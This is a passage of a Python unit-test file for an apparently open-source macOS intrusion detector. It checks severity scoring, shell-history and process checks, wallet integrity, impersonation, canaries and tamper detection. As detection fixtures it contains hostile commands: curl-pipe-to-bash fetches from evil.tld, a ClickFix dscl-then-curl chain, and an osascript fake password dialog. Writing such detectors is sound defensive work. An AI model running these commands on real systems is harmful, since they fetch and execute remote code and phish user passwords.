
    def test_fileless_fetch_exec_combo_is_high(self):
        # network fetch piped into an interpreter = the fileless pipeline.
        self.assertEqual(self._sev('curl -fsSL https://evil.tld/x | bash'), "HIGH")
        self.assertEqual(self._sev('curl -s https://evil.tld/s | osascript'), "HIGH")

    def test_lone_curl_pipe_is_not_notify_grade(self):
        # A bare pipe-to-shell with NO network fetch (benign-ish) stays < HIGH.
        sev = self._sev('cat script.sh | bash')
        self.assertIsNotNone(sev)
        self.assertLess(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_antivm_probe_is_medium(self):
        self.assertEqual(self._sev('sysctl hw.optional.arm.FEAT_BTI'), "MEDIUM")

    def test_benign_argv_is_clean(self):
        self.assertIsNone(self._sev('/usr/bin/python3 /Users/x/app.py --serve'))
        self.assertIsNone(self._sev('git commit -m "curl the docs later"'))

    def test_perl_regex_alternation_not_a_pipe(self):
        # A `|` INSIDE a quoted perl/sed regex alternation is not a shell pipe —
        # `s{(rm|node|perl)}` must NOT trip pipe-to-interpreter (live-host FP fix).
        sigs = aegis._argv_signals("perl -i -pe 's{(rm|mv|node|perl|python)}{X}g' f")
        self.assertNotIn("pipe-to-interpreter", [n for n, _ in sigs], sigs)


# --------------------------------------------------------------------------- #
# N15 — check_behavior: same-user filtering + never flags Aegis itself.
# --------------------------------------------------------------------------- #
class TestCheckBehavior(Sandbox):
    def _run_with_ps(self, ps_rows):
        # Sandbox stubs check_behavior to []; restore the real one and feed it a
        # canned process table via a stubbed aegis.run.
        real_check = self._saved["check_behavior"]
        saved_run = aegis.run

        def fake_run(cmd, timeout=15):
            if cmd[:2] == ["ps", "-axo"]:
                return "\n".join(ps_rows), "", 0
            return saved_run(cmd, timeout)
        aegis.run = fake_run
        try:
            return real_check()
        finally:
            aegis.run = saved_run

    def test_same_user_hostile_process_flagged(self):
        uid = str(os.getuid())
        rows = ["  501 %s /usr/bin/osascript osascript -e display dialog "
                "\"pw\" default answer \"\" with hidden answer" % uid]
        fs = self._run_with_ps(rows)
        self.assertTrue(any(f["category"] == "behavior" for f in fs), fs)
        self.assertEqual(fs[0]["severity"], "CRITICAL")

    def test_other_user_process_ignored(self):
        # uid 0 (root) row: unprivileged Aegis can't trust its argv → skipped.
        rows = ["    1 0 /usr/bin/osascript osascript -e display dialog "
                "\"pw\" default answer \"\" with hidden answer"]
        self.assertEqual(self._run_with_ps(rows), [])

    def test_aegis_itself_not_flagged(self):
        # Self-exclusion is by the real PID (unspoofable), so our OWN scanning
        # process is skipped even when its argv carries hostile-looking patterns.
        uid = str(os.getuid())
        mypid = str(os.getpid())
        rows = ["%6s %s /usr/bin/osascript osascript -e display dialog \"pw\" "
                "default answer \"\" with hidden answer" % (mypid, uid)]
        self.assertEqual(self._run_with_ps(rows), [])

    def test_aegis_substring_in_argv_does_not_evade(self):
        # An attacker who reads this open-source check cannot dodge detection by
        # putting the literal word "aegis" in their command line (the old substring
        # self-exclusion let a phish dialog reading "System aegis needs…" through).
        uid = str(os.getuid())
        rows = ["  888 %s /usr/bin/osascript osascript -e display dialog "
                "\"System aegis needs your password\" default answer \"\" "
                "with hidden answer" % uid]
        fs = self._run_with_ps(rows)
        self.assertTrue(any(f["category"] == "behavior" for f in fs), fs)
        self.assertEqual(fs[0]["severity"], "CRITICAL")


# --------------------------------------------------------------------------- #
# N16 — shell HISTORY: ClickFix terminal-paste residue.
# --------------------------------------------------------------------------- #
class TestShellHistory(Sandbox):
    def _hist(self, *lines):
        p = os.path.join(self.tmp, ".zsh_history")
        with open(p, "w") as f:
            f.write("\n".join(lines) + "\n")
        aegis.SHELL_HISTORY_FILES = [p]
        return aegis.check_shell_history()

    def test_clickfix_chain_flagged_high(self):
        fs = self._hist("ls -la",
                        "dscl . -authonly $(whoami) $PW && curl -o /tmp/update https://evil.tld/x")
        self.assertTrue(fs)
        self.assertEqual(fs[0]["severity"], "HIGH")
        self.assertEqual(fs[0]["category"], "shell-history")

    def test_zsh_extended_history_prefix_stripped(self):
        fs = self._hist(": 1700000000:0;curl -fsSL https://evil.tld/x | bash")
        self.assertTrue(fs)

    def test_clean_history_no_findings(self):
        self.assertEqual(self._hist("cd ~/src", "git status", "make test"), [])

    def test_lone_benign_fetch_is_not_notify_grade(self):
        # A lone `curl https://…` (no pipe-to-shell) is everyday dev work — it must
        # score MEDIUM (logged, below the HIGH notify floor), NOT fire a HIGH
        # desktop alert. Same gating the live-process behavioral tier uses.
        fs = self._hist("curl -fsSL https://raw.githubusercontent.com/x/y/main/i.sh")
        self.assertTrue(fs)
        self.assertEqual(fs[0]["severity"], "MEDIUM")
        self.assertLess(aegis.SEV_ORDER[fs[0]["severity"]],
                        aegis.SEV_ORDER[aegis.NOTIFY_MIN_SEV])

    def test_first_run_adopts_history_silently_then_new_alerts(self):
        # Shell-history residue (a months-old `curl|sh` install line) is adopted
        # silently on the FIRST scan — logged, not notified — so upgrading Aegis on
        # a busy machine is not a storm; a NEW hostile line thereafter alerts.
        f1 = aegis.finding("HIGH", "shell-history",
                           "Hostile command in shell history", "old install",
                           "shellhist:.zsh_history:aaaa1111")
        self.assertEqual(aegis.emit([f1], first_run=True), [],
                         "existing history must be silent on first run")
        f2 = aegis.finding("HIGH", "shell-history",
                           "Hostile command in shell history", "new phish",
                           "shellhist:.zsh_history:bbbb2222")
        self.assertEqual(len(aegis.emit([f2], first_run=False)), 1,
                         "a new hostile line must alert after first run")

    def test_first_run_does_not_suppress_live_behavior(self):
        # Contrast: a RUNNING hostile process (behavior) is a live threat and must
        # alert even on the very first scan — suppression is residue-only.
        fb = aegis.finding("CRITICAL", "behavior", "Suspicious process behavior",
                           "osascript phish", "behavior:osascript:cccc3333")
        self.assertEqual(len(aegis.emit([fb], first_run=True)), 1)

    def test_upgrade_adopts_history_silently_then_new_line_alerts(self):
        # README guarantee: upgrading Aegis on an existing install is storm-free
        # per-surface. shell-history is a LIVE surface, so an install predating it
        # (a baseline with no `shell_history_adopted` marker) must adopt existing
        # residue SILENTLY on the first scan that supports it — NOT alert a
        # months-old `curl|sh` line — then alert genuinely-new hostile lines.
        hist = os.path.join(self.tmp, ".zsh_history")
        with open(hist, "w") as f:
            f.write("curl -fsSL https://evil.tld/old | bash\n")  # pre-existing residue
        aegis.SHELL_HISTORY_FILES = [hist]
        # A pre-existing (pre-feature) baseline: valid, but with no adoption marker.
        aegis.save_json(aegis.BASELINE, {"created": "2020-01-01T00:00:00+00:00",
                                         "persistence": {}})
        aegis.cmd_scan(quiet=True)
        self.assertEqual(self.notifications, [],
                         "upgrade must adopt existing history residue silently")
        base = aegis.load_json(aegis.BASELINE, {})
        self.assertTrue(base.get("shell_history_adopted"),
                        "adoption marker must be recorded so it happens once")
        # A NEW hostile line after adoption must alert.
        with open(hist, "a") as f:
            f.write("curl -fsSL https://evil.tld/new | bash\n")
        aegis.cmd_scan(quiet=True)
        self.assertTrue(self.notifications,
                        "a new hostile history line must alert after adoption")


# --------------------------------------------------------------------------- #
# N17 — /tmp loot-staging IOC filenames.
# --------------------------------------------------------------------------- #
class TestStaging(Sandbox):
    def _stage(self, name, age_days=0):
        d = os.path.join(self.tmp, "stg")
        os.makedirs(d, exist_ok=True)
        p = os.path.join(d, name)
        with open(p, "w") as f:
            f.write("loot")
        if age_days:
            old = time.time() - age_days * 86400
            os.utime(p, (old, old))
        aegis.STAGING_DIRS = [d]
        return aegis.check_staging()

    def test_ioc_archive_flagged(self):
        fs = self._stage("app.zip")
        self.assertTrue(fs)
        self.assertEqual(fs[0]["severity"], "HIGH")
        self.assertEqual(fs[0]["category"], "staging")

    def test_staged_keychain_flagged(self):
        self.assertTrue(self._stage("login.keychain-db"))

    def test_non_ioc_ignored(self):
        self.assertEqual(self._stage("myproject.zip"), [])

    def test_old_ioc_ignored(self):
        self.assertEqual(self._stage("app.zip", age_days=30), [])


# --------------------------------------------------------------------------- #
# N18 — XProtect Remediator harvest: a detection event → CRITICAL; clean → none.
# --------------------------------------------------------------------------- #
class TestXProtectHarvest(Sandbox):
    def _harvest(self, ndjson_lines):
        aegis.XPROTECT_BUNDLES = []  # skip freshness; test detection parsing only
        real = self._saved["check_xprotect"]

        def fake_run(cmd, timeout=45):
            if cmd[:2] == ["log", "show"]:
                return "\n".join(ndjson_lines), "", 0
            return "", "", 0
        saved_run = aegis.run
        aegis.run = fake_run
        try:
            return real()
        finally:
            aegis.run = saved_run

    def _event(self, module, status, caused=None):
        msg = json.dumps({"status_message": status, "caused_by": caused or []})
        return json.dumps({
            "processImagePath":
                "/Library/Apple/System/Library/CoreServices/XProtect.app/"
                "Contents/MacOS/XProtectRemediator%s" % module,
            "eventMessage": msg, "timestamp": "2026-07-13 18:42:58"})

    def test_detection_is_critical(self):
        fs = self._harvest([self._event("KeySteal", "ThreatRemediated",
                                        ["/tmp/evil"])])
        self.assertTrue(fs)
        self.assertEqual(fs[0]["severity"], "CRITICAL")
        self.assertEqual(fs[0]["category"], "xprotect")

    def test_clean_scan_no_finding(self):
        self.assertEqual(
            self._harvest([self._event("RankStank", "NoThreatDetected")]), [])


# --------------------------------------------------------------------------- #
# N19 — wallet integrity surface: a config/binary change alerts HIGH.
# --------------------------------------------------------------------------- #
class TestWalletIntegrity(Sandbox):
    def test_wallet_config_change_is_high(self):
        p = os.path.join(self.tmp, "app.json")
        with open(p, "w") as f:
            f.write('{"endpoints":"legit"}')
        aegis.WALLET_CONFIG_FILES = [p]
        aegis.WALLET_APP_BINS = []
        prior = aegis.snapshot_wallet()
        with open(p, "w") as f:
            f.write('{"endpoints":"attacker"}')
        fs = aegis.diff_wallet(prior, aegis.snapshot_wallet())
        self.assertTrue(fs)
        self.assertEqual(fs[0]["severity"], "HIGH")
        self.assertEqual(fs[0]["category"], "wallet-integrity")


# --------------------------------------------------------------------------- #
# N20 — known-vendor label impersonation (ClickFix Keystone): a com.google.*
# label whose program isn't Google-signed is HIGH/CRITICAL; a genuine one isn't.
# --------------------------------------------------------------------------- #
class TestVendorImpersonation(Sandbox):
    def _sev(self, label, authority, prog="/Users/x/.hidden/GoogleUpdate"):
        rec = {"label": label, "program": prog, "args": [prog],
               "trust": "developer-id", "sha256": "s", "run_at_load": True,
               "env": None, "authority": authority}
        return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]

    def test_fake_keystone_is_high_or_critical(self):
        sev = self._sev("com.google.keystone.agent",
                        "Developer ID Application: Totally Not Google (ABCDE12345)")
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_genuine_google_not_impersonation(self):
        # Correct Google Team ID in the authority → not flagged as impersonation.
        # (A trusted-path, dev-id-signed Google agent should not score HIGH here.)
        sev = self._sev("com.google.keystone.agent",
                        "Developer ID Application: Google LLC (EQHXZ8M8AV)",
                        prog="/Library/Google/GoogleSoftwareUpdate/agent")
        self.assertLess(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_real_keystone_unresolvable_program_not_high(self):
        # Live-host FP fix: the REAL Google Keystone plist often points at a path
        # absent at scan time (trust 'unknown', no authority) — an unresolvable
        # program is a weak 'missing' signal, NOT impersonation, so it must not be
        # HIGH (would false-positive on legitimate Google software every scan).
        rec = {"label": "com.google.keystone.agent", "program": None,
               "args": None, "trust": "unknown", "sha256": None,
               "run_at_load": True, "env": None, "authority": None}
        sev = aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]
        self.assertLess(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)


# --------------------------------------------------------------------------- #
# N21 — canary / honeypot tripwire: modified or deleted canary → CRITICAL.
# --------------------------------------------------------------------------- #
class TestCanaries(Sandbox):
    def _plant(self, content="canary"):
        p = os.path.join(self.tmp, "canary.txt")
        with open(p, "w") as f:
            f.write(content)
        aegis.save_json(aegis.CANARY_STATE, {p: aegis.sha256(p)})
        return p

    def test_intact_canary_no_finding(self):
        self._plant()
        self.assertEqual(aegis.check_canaries(), [])

    def test_modified_canary_is_critical(self):
        p = self._plant()
        with open(p, "w") as f:
            f.write("ENCRYPTED_BY_RANSOMWARE")
        fs = aegis.check_canaries()
        self.assertTrue(fs)
        self.assertEqual(fs[0]["severity"], "CRITICAL")

    def test_deleted_canary_is_critical(self):
        p = self._plant()
        os.remove(p)
        fs = aegis.check_canaries()
        self.assertTrue(fs and fs[0]["severity"] == "CRITICAL")


# --------------------------------------------------------------------------- #
# N22 — trust-store tamper: baseline.json edited out-of-band → self-protection HIGH.
# --------------------------------------------------------------------------- #
class TestTrustStoreTamper(Sandbox):
    def test_out_of_band_baseline_edit_flagged(self):
        aegis.save_json(aegis.BASELINE, {"persistence": {}})
        aegis.record_selfstate()  # records the baseline hash as known-good
        # Attacker edits the baseline directly (poisons ground truth).
        aegis.save_json(aegis.BASELINE, {"persistence": {"/evil.plist": {}}})
        fs = aegis.check_self_protection()
        self.assertTrue(any("tampered" in f["fingerprint"] for f in fs), fs)

    def test_no_false_positive_when_unchanged(self):
        aegis.save_json(aegis.BASELINE, {"persistence": {}})
        aegis.record_selfstate()
        fs = aegis.check_self_protection()
        self.assertFalse(any("tampered" in f["fingerprint"] for f in fs), fs)


if __name__ == "__main__":
    unittest.main(verbosity=2)
